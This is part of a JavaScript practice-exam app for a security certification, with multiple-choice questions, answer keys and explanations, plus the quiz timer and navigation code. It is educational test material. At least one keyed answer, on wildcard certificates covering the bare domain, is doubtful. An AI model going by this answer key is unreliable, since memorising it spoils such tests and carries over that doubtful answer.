+    explanation:"<strong>BYOD (Bring Your Own Device)</strong> with <strong>containerization</strong> (also called MAM — Mobile Application Management) creates a secure corporate container on personal devices. Corporate data stays in the container, which can be selectively wiped without affecting personal data. COPE is company-owned but personal use allowed. CYOD lets employees choose from an approved list. COBO is company-owned for business use only."
+  },
+  {
+    domain:"2.2 – Network Architecture",
+    text:"A company implements a micro-segmentation strategy using software-defined networking (SDN). What is the PRIMARY security benefit?",
+    options:["Increased network speed","Lateral movement is significantly restricted — compromise of one segment doesn't automatically grant access to others","Reduced hardware costs","Simplified network management"],
+    correct:1,
+    explanation:"<strong>Micro-segmentation</strong> using SDN creates granular security perimeters around individual workloads, VMs, or containers — not just traditional network zones. The primary security benefit is <strong>restricting lateral movement</strong>: if an attacker compromises one workload, they face additional authentication barriers to reach others. This implements Zero Trust at the workload level. NSX (VMware) and Cisco ACI are common SDN platforms."
+  },
+  {
+    domain:"4.5 – Security Tools",
+    text:"A security team wants to attract attackers, study their techniques, and divert them from real assets using a fake vulnerable server. This is called a:",
+    options:["Vulnerability Scanner","Honeypot","Canary Token","Dark Web Monitor"],
+    correct:1,
+    explanation:"A <strong>Honeypot</strong> is a decoy system designed to attract attackers, log their activities, and study attack techniques while protecting real assets. A <em>Honeynet</em> is a network of honeypots. <em>Canary tokens</em> are specific deceptive resources (fake credentials, documents) that trigger alerts when accessed. Any interaction with a honeypot is immediately suspicious since legitimate users have no reason to access it."
+  },
+  {
+    domain:"5.2 – Risk Assessment",
+    text:"A risk assessment methodology that uses exact dollar figures (e.g., ALE = SLE × ARO) is called:",
+    options:["Qualitative Risk Assessment","Quantitative Risk Assessment","Semi-quantitative Risk Assessment","Operational Risk Assessment"],
+    correct:1,
+    explanation:"<strong>Quantitative Risk Assessment</strong> uses monetary values: <em>SLE (Single Loss Expectancy)</em> = asset value × exposure factor; <em>ARO (Annualized Rate of Occurrence)</em> = how often per year; <em>ALE (Annualized Loss Expectancy)</em> = SLE × ARO. This supports ROI calculations for security investments. <strong>Qualitative</strong> uses descriptive ratings (High/Medium/Low). Quantitative is more precise but requires accurate historical data."
+  },
+  {
+    domain:"3.2 – Firewall Rules",
+    text:"An organization implements a rule to block ALL inbound traffic by default and only permit explicitly authorized traffic. This approach is called:",
+    options:["Implicit Allow","Default Deny / Allowlist approach","Stateful Inspection","Egress Filtering"],
+    correct:1,
+    explanation:"<strong>Default Deny (Implicit Deny)</strong> blocks everything unless explicitly permitted — the most secure firewall baseline. Only necessary traffic is whitelisted. This contrasts with 'default allow,' where everything is permitted unless explicitly blocked. Default deny is a foundational security principle: minimize attack surface by only allowing what is required. Egress filtering applies the same concept to outbound traffic."
+  },
+  {
+    domain:"2.3 – Key Management",
+    text:"A company encrypts each customer's data with a unique key derived from a master key and the customer's unique identifier. If one customer's data key is compromised, what is the impact?",
+    options:["All customers' data is compromised because the master key is exposed","Only that specific customer's data is at risk — other customers' derived keys remain secure","The master key must be changed and all data re-encrypted","Data derivation prevents encryption entirely"],
+    correct:1,
+    explanation:"Using <strong>derived keys</strong> (key derivation functions like HKDF or PBKDF2) with unique inputs (customer ID) per customer means each customer gets a cryptographically distinct key. Compromising one derived key does NOT expose the master key or other derived keys — providing key isolation. This is a fundamental principle of key hierarchy design. However, compromising the master key would expose all derived keys."
+  },
+  {
+    domain:"1.1 – Physical Security",
+    text:"An unauthorized person follows an authorized employee through a secured door without swiping their own badge, by walking close behind them. This is called:",
+    options:["Shoulder Surfing","Tailgating / Piggybacking","Social Engineering","Impersonation"],
+    correct:1,
+    explanation:"<strong>Tailgating (Piggybacking)</strong> is a physical security bypass where an unauthorized person follows an authorized user through an access-controlled entry point without authenticating. Countermeasures include: security awareness training, mantraps/airlocks (one-person-at-a-time vestibules), security guards, and turnstiles. Shoulder surfing observes sensitive input (PINs, passwords) without gaining physical access to a restricted area."
+  },
+  {
+    domain:"4.2 – Containment Strategies",
+    text:"During an active ransomware outbreak, the IR team finds 3 of 200 servers are encrypted. The remaining servers are still operational. Which containment action is MOST appropriate?",
+    options:["Immediately shut down all 200 servers","Network isolate the affected servers while maintaining operations on clean systems","Wipe and restore all servers from backup","Pay the ransom to get decryption keys"],
+    correct:1,
+    explanation:"<strong>Targeted isolation</strong> of confirmed infected systems prevents ransomware propagation while minimizing business disruption. Shutting down all servers causes unnecessary impact. Wiping before forensic imaging destroys evidence. Ransom payment is a last resort with no guarantee of decryption and may violate sanctions laws. During containment: isolate, preserve evidence, identify patient-zero, then proceed to eradication and recovery."
+  },
+  {
+    domain:"5.3 – Data Privacy",
+    text:"An organization replaces real customer credit card numbers with randomly generated tokens in all application databases. The original numbers are stored only in a secure vault. This technique is called:",
+    options:["Encryption","Tokenization","Data Masking","Hashing"],
+    correct:1,
+    explanation:"<strong>Tokenization</strong> replaces sensitive data with non-sensitive placeholders (tokens) that have no exploitable value. The mapping between token and real value is in a secure vault. Unlike encryption, there is no mathematical relationship between token and original — stolen tokens cannot be reversed. Tokenization is widely used for PCI DSS compliance. Data masking obfuscates data for testing. Hashing is one-way but attackers can use rainbow tables."
+  },
+  {
+    domain:"3.3 – Federation & SSO",
+    text:"A company allows employees to log into SaaS apps using their corporate Active Directory credentials via a web browser without re-entering passwords. This is accomplished through:",
+    options:["RADIUS","LDAP","SAML 2.0 / SSO Federation","OAuth only"],
+    correct:2,
+    explanation:"<strong>SAML 2.0 (Security Assertion Markup Language)</strong> is the standard protocol for web-based SSO federation. The corporate IdP (Identity Provider, e.g., AD FS, Azure AD) authenticates the user and sends a signed SAML assertion to the SaaS SP (Service Provider), granting access without a separate password. RADIUS is for network authentication. LDAP is a directory protocol. OAuth handles authorization (not authentication) — OIDC is the authentication layer on top of OAuth."
+  },
+  {
+    domain:"1.6 – Insider Threats",
+    text:"A database administrator copies entire customer tables to a personal USB drive over several months before resigning. This is an example of:",
+    options:["Accidental data loss","Malicious Insider Threat / Data Exfiltration","Shadow IT","Privilege Escalation"],
+    correct:1,
+    explanation:"A <strong>Malicious Insider</strong> is a trusted employee who intentionally abuses their legitimate access for personal gain, sabotage, or espionage. This scenario represents <strong>data exfiltration</strong> — systematically stealing data using authorized access. Detection methods include DLP (Data Loss Prevention) solutions, UEBA (detecting unusual data access patterns), and monitoring for large data exports to removable media."
+  },
+  {
+    domain:"2.4 – Quantum Cryptography",
+    text:"Which of the following encryption algorithms is considered VULNERABLE to attacks by a sufficiently powerful quantum computer (Shor's algorithm)?",
+    options:["AES-256","RSA-2048 and ECC","SHA-256","HMAC-SHA512"],
+    correct:1,
+    explanation:"<strong>RSA and ECC</strong> rely on the computational difficulty of factoring large numbers or solving discrete logarithm problems — both of which Shor's algorithm can solve efficiently on a quantum computer. <strong>AES-256</strong> is a symmetric cipher that is only weakened (not broken) by quantum computers — Grover's algorithm halves the effective key length (to 128 bits, still secure). NIST is standardizing post-quantum cryptographic algorithms (CRYSTALS-Kyber, CRYSTALS-Dilithium)."
+  },
+  {
+    domain:"3.5 – Data Loss Prevention",
+    text:"A DLP tool scans outbound emails for credit card numbers and blocks any that contain a pattern matching Luhn-valid 16-digit numbers. What type of DLP inspection is this?",
+    options:["Behavior-based DLP","File tagging DLP","Content Inspection / Pattern Matching DLP","Network DLP via flow analysis"],
+    correct:2,
+    explanation:"<strong>Content Inspection DLP</strong> uses pattern matching (regex), Luhn algorithm validation, and keyword detection to identify sensitive data in transit. It is a network DLP (NDLP) solution inspecting email content. Endpoint DLP controls data movement on devices. Behavior-based DLP flags unusual data access patterns. DLP solutions typically combine content inspection, file tagging (classification labels), and behavioral analytics for comprehensive coverage."
+  },
+  {
+    domain:"4.4 – Red Team / Blue Team",
+    text:"During a purple team exercise, the red team successfully executes a Pass-the-Hash attack. The blue team updates SIEM rules to detect this going forward. This exercise is designed to:",
+    options:["Replace penetration testing entirely","Improve detection and response capabilities by sharing attacker knowledge with defenders in real time","Train junior analysts on basic tools","Certify the organization's security posture"],
+    correct:1,
+    explanation:"A <strong>Purple Team</strong> exercise combines Red Team (offensive) and Blue Team (defensive) activities with <em>direct knowledge sharing</em>. The red team runs attacks and tells defenders exactly what they did; defenders tune their detection accordingly. This creates a continuous feedback loop that improves defensive coverage efficiently. Unlike siloed red or blue team exercises, purple teaming accelerates detection capability maturation."
+  },
+  {
+    domain:"5.4 – Business Impact Analysis",
+    text:"A BIA identifies that the payroll system is the most critical system. If it goes down, the company cannot pay employees. This system's criticality classification is called its:",
+    options:["Maximum Tolerable Downtime (MTD)","Business Impact Level","Mission Essential Function / Critical Business Function","Recovery Time Objective"],
+    correct:2,
+    explanation:"A <strong>Mission Essential Function (MEF)</strong> or <strong>Critical Business Function (CBF)</strong> is a process whose disruption would severely impact operations, finances, or compliance. BIA (Business Impact Analysis) identifies these functions, quantifies their financial and operational impact, and links them to IT systems (dependencies). BIA results drive BCP/DRP priorities — the most critical functions get the lowest RTOs/RPOs."
+  },
+  {
+    domain:"3.1 – DNS Security",
+    text:"Which protocol encrypts DNS queries to prevent eavesdropping and manipulation, sending DNS traffic over an HTTPS connection on port 443?",
+    options:["DNSSEC","DNS over HTTPS (DoH)","DNS over TLS (DoT)","Encrypted SNI (ESNI)"],
+    correct:1,
+    explanation:"<strong>DNS over HTTPS (DoH)</strong> encrypts DNS queries by wrapping them in HTTPS (port 443), preventing ISPs and attackers from seeing which domains you're resolving. <em>DNS over TLS (DoT)</em> also encrypts but uses port 853, making it easier to block. <em>DNSSEC</em> signs DNS records for integrity but doesn't encrypt them. DoH is increasingly deployed by browsers (Firefox, Chrome) to protect user privacy."
+  },
+  {
+    domain:"2.5 – Certificate Types",
+    text:"A company wants a single SSL certificate to secure both 'company.com' and 10 subdomains (mail.company.com, www.company.com, etc.). Which certificate type should they use?",
+    options:["Standard Domain Validation (DV) certificate","Extended Validation (EV) certificate","Wildcard Certificate (*.company.com)","Multi-Domain (SAN) Certificate"],
+    correct:2,
+    explanation:"A <strong>Wildcard Certificate</strong> (*.company.com) secures all first-level subdomains of a domain with a single certificate. It covers *.company.com but NOT nested subdomains (*.sub.company.com) — that would require another wildcard. A <strong>SAN (Subject Alternative Name)</strong> certificate can include multiple distinct domains. EV certificates show the organization name in browsers. DV only validates domain ownership."
+  },
+  {
+    domain:"4.3 – SIEM Use Cases",
+    text:"A SIEM rule fires when more than 10 failed login attempts are followed by a successful login within 5 minutes on the same account. What attack is this rule designed to detect?",
+    options:["Replay Attack","Brute Force / Password Spray with successful compromise","Session Hijacking","Insider Threat"],
+    correct:1,
+    explanation:"This rule detects <strong>brute force attacks</strong> that result in successful compromise — the 'locked-door analogy' of trying many keys until one works. Failed logins followed by a success is a strong indicator of account compromise via password guessing or password spray. Account lockout policies help prevent brute force. SIEM rules correlating failures to success are critical for detecting this pattern, especially for privileged accounts."
+  },
+  {
+    domain:"5.3 – Privacy Controls",
+    text:"Which data handling concept gives individuals the right to request deletion of their personal data from an organization's systems?",
+    options:["Data Minimization","The Right to be Forgotten / Right to Erasure","Data Portability","Purpose Limitation"],
+    correct:1,
+    explanation:"The <strong>Right to be Forgotten (Right to Erasure)</strong> is enshrined in GDPR Article 17 — individuals can request organizations delete their personal data under certain conditions (data no longer necessary, consent withdrawn, unlawful processing). Organizations must also notify third parties processing the data. <em>Data minimization</em> limits collection to what's necessary. <em>Data portability</em> allows individuals to receive their data in a machine-readable format."
+  },
+  {
+    domain:"1.3 – API Security",
+    text:"An API endpoint allows users to retrieve their own invoice by accessing /api/invoices/1234. A user changes the ID to 1235 and retrieves another customer's invoice. This vulnerability is:",
+    options:["SQL Injection","Broken Object Level Authorization (BOLA) / IDOR","Excessive Data Exposure","Security Misconfiguration"],
+    correct:1,
+    explanation:"<strong>BOLA (Broken Object Level Authorization)</strong>, also called <strong>IDOR (Insecure Direct Object Reference)</strong>, occurs when an API fails to verify that the requesting user is authorized to access the specific object they're requesting. Just because a user is authenticated doesn't mean they can access all object IDs. Fix: implement object-level authorization checks — verify the requesting user owns/has rights to every requested resource."
+  },
+  {
+    domain:"3.2 – Network Monitoring",
+    text:"A security tool analyzes NetFlow data and identifies an internal host sending 50GB of data to an external IP overnight. No alert was generated because the traffic was over standard HTTPS. What type of activity does this suggest?",
+    options:["Normal cloud backup activity","Data Exfiltration — covert channel using legitimate protocol","DDoS participation","DNS tunneling"],
+    correct:1,
+    explanation:"Large, unusual data flows to external IPs — especially during off-hours over legitimate protocols like HTTPS — are classic indicators of <strong>data exfiltration</strong>. Attackers use legitimate protocols to blend in with normal traffic (living off the land). NetFlow/IPFIX analysis and DLP can detect this through volume anomalies, even if content inspection fails. UEBA baselines normal data transfer patterns and alerts on deviations."
+  },
+  {
+    domain:"2.1 – Defense in Depth",
+    text:"An organization implements firewalls, IDS/IPS, endpoint AV, user training, MFA, and physical access controls simultaneously. This multi-layered security strategy is called:",
+    options:["Zero Trust","Defense in Depth","Minimum Security Baseline","Separation of Duties"],
+    correct:1,
+    explanation:"<strong>Defense in Depth</strong> (also called layered security) implements multiple independent security controls so that if one fails, others compensate. The concept comes from military strategy. Layers typically include: physical, network, host, application, data, and human (training) controls. No single control is 100% effective — layering reduces the probability that a threat bypasses ALL controls simultaneously."
+  },
+  {
+    domain:"4.1 – Patch Management",
+    text:"An organization's patch management policy requires critical patches be applied within 72 hours. A critical patch is released on a Friday and requires 2 hours of downtime. The system owner wants to delay until the following Monday. What is the CORRECT action?",
+    options:["Grant the exception and patch Monday","Require immediate patch application or implement compensating controls (firewall block, IPS rule) and document the deviation","Defer indefinitely since it's the weekend","Escalate to the CEO for a decision"],
+    correct:1,
+    explanation:"When immediate patching isn't feasible, organizations should implement <strong>compensating controls</strong> (blocking exploits at the network level, enhanced monitoring) while documenting the policy exception with a business justification and approved risk acceptance. Ignoring the policy without documentation violates governance. The risk must be acknowledged formally. Patching should proceed at the next available window within policy — the exception doesn't eliminate the obligation."
+  },
+  {
+    domain:"3.3 – Access Control",
+    text:"A user at a security clearance of SECRET can read TOP SECRET documents stored on the same system. Which access control model principle has been violated?",
+    options:["No Write Down (Bell-LaPadula)","No Read Up (Bell-LaPadula)","No Write Up (Biba)","No Read Down (Biba)"],
+    correct:1,
+    explanation:"The <strong>Bell-LaPadula model's 'No Read Up' (Simple Security Property)</strong> rule states: a subject cannot read objects at a higher classification level than their clearance. Allowing a SECRET-cleared user to read TOP SECRET violates this fundamental MAC rule. The complementary rule, 'No Write Down,' prevents high-clearance users from writing to lower-classification objects (preventing downgrading data). Biba focuses on integrity (no read down, no write up)."
+  },
+  {
+    domain:"5.2 – Third-Party Risk",
+    text:"A company shares customer PII with a cloud payroll provider. The provider suffers a breach. What document should have established each party's security obligations BEFORE this relationship began?",
+    options:["SLA (Service Level Agreement)","BAA (Business Associate Agreement) or DPA (Data Processing Agreement)","NDA (Non-Disclosure Agreement)","MOU (Memorandum of Understanding)"],
+    correct:1,
+    explanation:"A <strong>BAA (Business Associate Agreement)</strong> (required under HIPAA) or <strong>DPA (Data Processing Agreement)</strong> (required under GDPR) legally establishes each party's obligations regarding data protection, breach notification, and compliance. An SLA defines service performance metrics. An NDA covers confidentiality but doesn't comprehensively address data security obligations. Third-party risk management requires contractual security requirements, audits, and ongoing vendor assessment."
+  },
+  {
+    domain:"4.2 – Malware Analysis",
+    text:"A malware analyst executes a suspicious binary in an isolated virtual machine, monitoring all network connections, file system changes, and registry modifications. This technique is called:",
+    options:["Static Analysis","Dynamic Analysis / Sandboxing","Reverse Engineering","Code Review"],
+    correct:1,
+    explanation:"<strong>Dynamic Analysis (Sandboxing)</strong> executes malware in a controlled, isolated environment to observe its runtime behavior — network connections, file drops, registry changes, process injection. <em>Static analysis</em> examines the binary without execution (strings, PE headers, disassembly). <em>Reverse engineering</em> is deep static analysis of disassembled code logic. Sandboxing tools include Cuckoo Sandbox, ANY.RUN, and commercial platforms like VMware NSX sandbox."
+  },
+  {
+    domain:"3.4 – Data Backup",
+    text:"An organization performs a full backup Sunday, then incremental backups Monday–Saturday. On Thursday the drive fails. What backups are needed to restore to Wednesday's state?",
+    options:["Sunday full backup only","Sunday full + Monday, Tuesday, Wednesday incrementals","Wednesday incremental only","Sunday full + Wednesday incremental only"],
+    correct:1,
+    explanation:"<strong>Incremental backups</strong> only capture changes since the last backup (full OR incremental). To restore Wednesday's state: Sunday full (baseline) + Monday incremental (changes Mon) + Tuesday incremental (changes Tue) + Wednesday incremental (changes Wed). This requires more restore time than differential backups. <em>Differential</em> backups capture all changes since the last full — restoring only requires the last full + the most recent differential."
+  },
+  {
+    domain:"2.3 – Secure Coding",
+    text:"A developer validates all user input on the client side (JavaScript) only. Why is this insufficient?",
+    options:["JavaScript runs too slowly for security validation","Attackers can bypass client-side validation by sending raw HTTP requests directly to the server","Client-side validation is more secure than server-side","JavaScript validation cannot handle special characters"],
+    correct:1,
+    explanation:"<strong>Client-side validation is purely cosmetic</strong> — it improves user experience but provides zero security. Attackers can use tools like Burp Suite, curl, or Postman to send arbitrary data directly to the server API, bypassing browser-side JavaScript entirely. <strong>Server-side validation and sanitization</strong> are mandatory security controls. Never trust any data from the client. Client-side and server-side validation should both be implemented — but only server-side is security-relevant."
+  },
+  {
+    domain:"1.5 – APT Characteristics",
+    text:"An attacker has maintained covert access to a government contractor's network for 14 months, slowly exfiltrating intellectual property. Which threat category does this represent?",
+    options:["Script Kiddie","Hacktivist","Advanced Persistent Threat (APT)","Insider Threat"],
+    correct:2,
+    explanation:"An <strong>APT (Advanced Persistent Threat)</strong> is characterized by: sophistication (advanced tools, zero-days), persistence (long dwell time, months to years), and specific targeting (nation-state, corporate espionage). APTs prioritize stealth over speed, often living in a network for months before detection. Nation-state actors like APT28 (Russia), APT41 (China), and Lazarus Group (DPRK) typify this threat. Average dwell time (before detection) has historically been 200+ days."
+  },
+  {
+    domain:"3.2 – Protocol Analysis",
+    text:"HTTPS traffic is captured. An analyst notices the TLS certificate's CN (Common Name) is 'windowsupdate.microsoft.com.evil.ru'. This is an example of:",
+    options:["Valid Microsoft update traffic","Domain Spoofing / Homograph Attack","BGP Hijacking","SSL Stripping"],
+    correct:1,
+    explanation:"<strong>Domain Spoofing</strong> uses a domain that appears legitimate but isn't — here, the real domain is 'evil.ru' with a subdomain mimicking Microsoft's URL. Certificate CN inspection reveals the deception. Homograph attacks use visually similar Unicode characters. SSL Stripping downgrades HTTPS to HTTP. This highlights why HSTS pinning, certificate transparency logs, and careful domain validation matter. Users and tools must verify the full domain, not just a familiar substring."
+  },
+  {
+    domain:"4.5 – Forensic Artifacts",
+    text:"During a Windows forensic investigation, which artifact would MOST reliably show recently accessed files, even if a user attempted to delete browsing history?",
+    options:["Windows Event Logs","Registry hive (NTUSER.DAT) — RecentDocs, UserAssist, ShellBags keys","System32 folder timestamps","Browser cache only"],
+    correct:1,
+    explanation:"The <strong>Windows Registry</strong> — specifically hives like NTUSER.DAT — stores persistent forensic artifacts in keys like: <em>RecentDocs</em> (recently opened files), <em>UserAssist</em> (program execution counts and timestamps), <em>ShellBags</em> (folder navigation history), and <em>MRU (Most Recently Used)</em> lists. These survive browser history deletion and provide reliable evidence of user activity. Registry forensics is a core skill in Windows incident response."
+  },
+  {
+    domain:"5.1 – Security Awareness",
+    text:"An organization conducts quarterly phishing simulations. An employee who clicks a simulated phishing link is automatically redirected to security training. What is the PRIMARY goal of this program?",
+    options:["To identify and terminate employees who fail security tests","To reduce the human attack surface through education and behavior change","To satisfy compliance requirements only","To replace technical controls with human vigilance"],
+    correct:1,
+    explanation:"Security awareness training programs aim to <strong>change employee behavior</strong> — making them more resistant to social engineering. Phishing simulations measure susceptibility and provide immediate 'teachable moments.' The goal is reducing the human risk vector, not punishing employees. Research shows repeated simulation + training significantly reduces click rates. Humans remain a critical layer in defense in depth — security awareness is a required control in ISO 27001 and NIST CSF."
+  },
+  {
+    domain:"3.1 – Secure Protocols",
+    text:"Which protocol provides integrity and confidentiality for IP packets at the network layer, and is commonly used in site-to-site VPNs?",
+    options:["SSL/TLS","IPsec (ESP mode)","SSH","SRTP"],
+    correct:1,
+    explanation:"<strong>IPsec</strong> operates at Layer 3 (network layer) and secures IP communications. In <strong>ESP (Encapsulating Security Payload)</strong> mode, it provides both encryption (confidentiality) and integrity. In AH (Authentication Header) mode, it provides integrity only. IPsec is the standard for site-to-site VPN tunnels. SSL/TLS operates at Layer 4-7 (transport/application). SSH secures remote access. SRTP secures real-time media (VoIP)."
+  },
+  {
+    domain:"2.4 – Steganography",
+    text:"A threat actor hides a command and control IP address inside a publicly posted JPEG image, embedded in the image's least significant bits. This data hiding technique is called:",
+    options:["Cryptography","Steganography","Obfuscation","Watermarking"],
+    correct:1,
+    explanation:"<strong>Steganography</strong> conceals data within non-secret carrier files (images, audio, video) without making the existence of the hidden message obvious — unlike encryption, which hides content but reveals that secret communication is occurring. Attackers use steganography for covert C2 communication and data exfiltration. Digital forensics tools like Stegdetect and StegSpy can detect certain steganographic techniques. Watermarking embeds identifying information rather than covert data."
+  },
+  {
+    domain:"4.3 – Network Forensics",
+    text:"An analyst uses Wireshark and observes DNS queries containing unusually long subdomains like '4f6f75722064617461207761732065786669..company.com'. What covert technique does this indicate?",
+    options:["DNS Cache Poisoning","DNS Tunneling for data exfiltration","DDoS Amplification Attack","DNS Hijacking"],
+    correct:1,
+    explanation:"<strong>DNS Tunneling</strong> encodes data (often base64 or hex) into DNS query subdomains to exfiltrate data or maintain C2 communication. DNS traffic is rarely blocked at firewalls, making it an effective covert channel. The hex string in the subdomain is encoded payload. Detection: monitor for abnormally long DNS queries, high query volume to single domains, and unusual query patterns. Tools like iodine and dnscat implement DNS tunneling."
+  },
+  {
+    domain:"5.4 – DRP Testing",
+    text:"An organization tests its DR plan by having key personnel talk through their response to a simulated disaster scenario, without actually activating systems. This test type is called a:",
+    options:["Full Interruption Test","Parallel Test","Tabletop Exercise","Simulation Test"],
+    correct:2,
+    explanation:"A <strong>Tabletop Exercise</strong> is a discussion-based DR/BCP test where stakeholders walk through a scenario verbally, identifying gaps in plans without actually activating recovery systems. It is low cost, low disruption, and excellent for evaluating plan completeness and team understanding. A <em>Parallel test</em> activates DR systems alongside production. A <em>Full Interruption test</em> actually fails over production — highest risk, highest confidence. Simulations test specific procedures."
+  },
+  {
+    domain:"3.3 – Authentication Protocols",
+    text:"A network switch uses 802.1X to authenticate devices before granting network access. The switch acts as the authenticator and passes credentials to a RADIUS server. In this model, what role does the RADIUS server play?",
+    options:["Supplicant","Authenticator","Authentication Server","Certificate Authority"],
+    correct:2,
+    explanation:"In 802.1X, three entities exist: the <strong>Supplicant</strong> (end device requesting access), the <strong>Authenticator</strong> (switch/AP enforcing access), and the <strong>Authentication Server</strong> (RADIUS server verifying credentials against a directory like Active Directory). RADIUS uses EAP to carry authentication messages. This model implements Network Access Control (NAC) — only authenticated and authorized devices receive network connectivity."
+  },
+  {
+    domain:"1.4 – Physical Attacks",
+    text:"An attacker attaches a hardware keylogger between a keyboard and a computer in a public kiosk. This is an example of:",
+    options:["Software-based Keylogging","Hardware Implant / Physical Attack","Side-Channel Attack","Cold Boot Attack"],
+    correct:1,
+    explanation:"A <strong>hardware keylogger</strong> is a physical device inserted between a keyboard and computer that captures all keystrokes to internal storage or transmits them wirelessly. No software installation is needed — it works regardless of OS security. Countermeasures: physically inspect machines, use virtual keyboards for sensitive input, deploy kiosk management systems, and secure equipment rooms. Hardware implants are also a nation-state attack vector (supply chain)."
+  },
+  {
+    domain:"2.2 – Containerization",
+    text:"Which namespace isolation feature in Linux allows containers to have separate network stacks, process trees, and file systems from the host?",
+    options:["cgroups (control groups)","Linux Namespaces","SELinux","AppArmor"],
+    correct:1,
+    explanation:"<strong>Linux Namespaces</strong> provide kernel-level isolation for containers — each namespace gives a container its own isolated view of network interfaces, process IDs, mount points, and user IDs. <em>cgroups</em> limit and meter resource usage (CPU, memory, I/O). <em>SELinux</em> and <em>AppArmor</em> are Mandatory Access Control frameworks that restrict what containers can do. Together, namespaces + cgroups + LSM (SELinux/AppArmor) form the security foundation of container isolation."
+  },
+  {
+    domain:"5.2 – Security Controls",
+    text:"Which category of security control is a fire sprinkler system in a data center?",
+    options:["Preventive Detective control","Corrective Physical control","Detective Administrative control","Preventive Physical control — with Corrective Physical control characteristics"],
+    correct:3,
+    explanation:"Fire sprinklers are <strong>Physical</strong> controls (protect physical assets). They are <strong>Preventive</strong> (prevent the fire from spreading) and also <strong>Corrective</strong> (respond to an active fire — correcting the threat). Security controls are categorized by type (Technical, Administrative, Physical) and function (Preventive, Detective, Corrective, Deterrent, Compensating). Knowing both dimensions is an exam requirement."
+  },
+  {
+    domain:"4.2 – Threat Classification",
+    text:"A lone hacker defaces a government website to protest a policy decision and posts the source code of an internal system online. This attacker type is BEST described as:",
+    options:["Nation-State Actor","Hacktivist","Script Kiddie","Organized Crime"],
+    correct:1,
+    explanation:"A <strong>Hacktivist</strong> uses hacking techniques to advance a political, social, or ideological agenda — combining 'hacking' and 'activism.' Anonymous and LulzSec are historical examples. Their TTPs include website defacement, DDoS, and data leaks. Their motivation is ideological, not financial. Nation-state actors have government backing and strategic objectives. Script kiddies use pre-built tools without deep skill. Organized crime is financially motivated."
+  },
+  {
+    domain:"3.5 – CASB",
+    text:"An organization wants to monitor and control employee use of unsanctioned cloud apps (Shadow IT) — seeing what data is being uploaded to personal Dropbox, Google Drive, and other services. Which solution type addresses this?",
+    options:["SIEM","CASB (Cloud Access Security Broker)","WAF","DLP Only"],
+    correct:1,
+    explanation:"A <strong>CASB (Cloud Access Security Broker)</strong> sits between users and cloud services to provide visibility, compliance enforcement, data security, and threat protection. It can discover Shadow IT (unsanctioned apps), apply DLP policies to cloud uploads, enforce MFA for cloud access, and block unsanctioned services. Deployed as forward proxy, reverse proxy, or API integration. Major CASBs: Microsoft Defender for Cloud Apps, Netskope, Zscaler."
+  },
+  {
+    domain:"2.3 – Secure Design",
+    text:"A developer builds an application that stores all user session tokens in a cookie without the HttpOnly flag. What vulnerability does this create?",
+    options:["The cookies are sent over HTTP instead of HTTPS","An XSS attack can steal session tokens via JavaScript (document.cookie)","CSRF attacks become impossible","The tokens cannot expire properly"],
+    correct:1,
+    explanation:"The <strong>HttpOnly flag</strong> on cookies prevents JavaScript from accessing them via <code>document.cookie</code>. Without it, a <strong>Stored XSS</strong> attack can steal session tokens. With HttpOnly set, even a successful XSS injection cannot access those cookies. The <em>Secure flag</em> ensures cookies are only sent over HTTPS. The <em>SameSite</em> attribute helps prevent CSRF. Proper cookie security requires all three flags for sensitive tokens."
+  },
+  {
+    domain:"4.1 – Vulnerability Scanning",
+    text:"A security team runs a credentialed vulnerability scan vs. an uncredentialed scan on the same server. The credentialed scan finds 47 vulnerabilities; uncredentialed finds 12. Why the difference?",
+    options:["The credentialed scan has more false positives","Credentialed scans have authenticated access to check installed software versions, configuration details, and internal registry/file system — uncredentialed scans only see exposed services","The uncredentialed scan is more thorough","Credentialed scans always run more scan plugins"],
+    correct:1,
+    explanation:"<strong>Credentialed scans</strong> authenticate to the target system and can inspect installed software versions, patches, registry settings, local configuration, and OS internals — providing far more accurate and comprehensive results. <strong>Uncredentialed scans</strong> only see externally exposed services (open ports, banner grabbing) — simulating an unauthenticated attacker perspective. Credentialed scans are best for internal vulnerability management; uncredentialed simulates external exposure."
+  },
+  {
+    domain:"5.3 – Compliance Frameworks",
+    text:"An organization processes US federal government data. Which compliance framework is REQUIRED for their information systems?",
+    options:["PCI DSS","HIPAA","FISMA / NIST RMF","SOX"],
+    correct:2,
+    explanation:"<strong>FISMA (Federal Information Security Modernization Act)</strong> requires federal agencies and contractors handling federal data to implement security controls defined by <strong>NIST SP 800-53</strong> and follow the <strong>Risk Management Framework (RMF)</strong> authorization process. PCI DSS governs payment cards, HIPAA governs health data, and SOX governs public company financial controls. FISMA compliance is mandatory for all federal information systems."
+  }
+];
+
+// Trim to exactly 90 questions
+questions.splice(90);
+
+// State
+let currentQ = 0, correctCount = 0, wrongCount = 0, skippedCount = 0;
+let answered = false, timerInterval = null, secondsLeft = 90 * 60;
+let results = new Array(questions.length).fill(null); // null=unanswered, true=correct, false=wrong
+let flagged = new Set();
+let domainStats = {};
+
+function startExam() {
+  document.getElementById('intro-screen').classList.add('hidden');
+  const es = document.getElementById('exam-screen');
+  es.style.display = 'block';
+  document.getElementById('header-stats').style.display = 'flex';
+  document.getElementById('q-total').textContent = questions.length;
+  document.getElementById('result-total').textContent = '/ ' + questions.length;
+  document.getElementById('stat-remaining').textContent = questions.length;
+  buildAnsweredMap();
+  renderQuestion();
+  startTimer();
+}
+
+function startTimer() {
+  timerInterval = setInterval(() => {
+    secondsLeft--;
+    if (secondsLeft <= 0) { clearInterval(timerInterval); showResults(); }
+    updateTimerDisplay();
+  }, 1000);
+}
+
+function updateTimerDisplay() {
+  const m = Math.floor(secondsLeft / 60).toString().padStart(2,'0');
+  const s = (secondsLeft % 60).toString().padStart(2,'0');
+  const el = document.getElementById('timer');
+  el.textContent = `${m}:${s}`;
+  el.className = 'timer' + (secondsLeft < 300 ? ' warn' : '');
+}
+
+function buildAnsweredMap() {
+  const map = document.getElementById('answered-map');
+  map.innerHTML = '';
+  for (let i = 0; i < questions.length; i++) {
+    const d = document.createElement('div');
+    d.className = 'am-dot' + (i === currentQ ? ' current' : '') +
+      (results[i] === true ? ' answered-c' : results[i] === false ? ' answered-w' : results[i] === 'skip' ? ' skipped' : '') +
+      (flagged.has(i) ? ' flagged-dot' : '');
+    d.title = `Q${i+1}`;
+    d.onclick = () => jumpTo(i);
+    map.appendChild(d);
+  }
+}
+
+function jumpTo(idx) {
+  currentQ = idx;
+  renderQuestion();
+  buildAnsweredMap();
+}
+
+function renderQuestion() {
+  const q = questions[currentQ];
+  document.getElementById('q-num').textContent = currentQ + 1;
+  document.getElementById('stat-remaining').textContent = questions.length - (results.filter(r => r !== null).length);
